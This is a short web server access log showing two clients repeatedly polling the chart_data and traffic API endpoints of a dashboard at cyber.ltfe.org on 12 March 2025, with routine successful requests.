193.189.185.113 - - [12/Mar/2025:11:11:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:11:11:07 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 103553 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:12:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3080 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:12:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:12:54 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 103553 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
82.198.201.114 - - [12/Mar/2025:11:13:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:13:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:14:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:14:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:15:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:15:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
82.198.201.114 - - [12/Mar/2025:11:16:01 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
193.189.185.113 - - [12/Mar/2025:11:16:02 +0000] "GET /api-web/v1/chart_data?timespan=60 HTTP/1.1" 200 3079 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
193.189.185.113 - - [12/Mar/2025:11:16:15 +0000] "GET /api-web/v1/traffic?timespan=60 HTTP/1.1" 200 103466 "https://cyber.ltfe.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
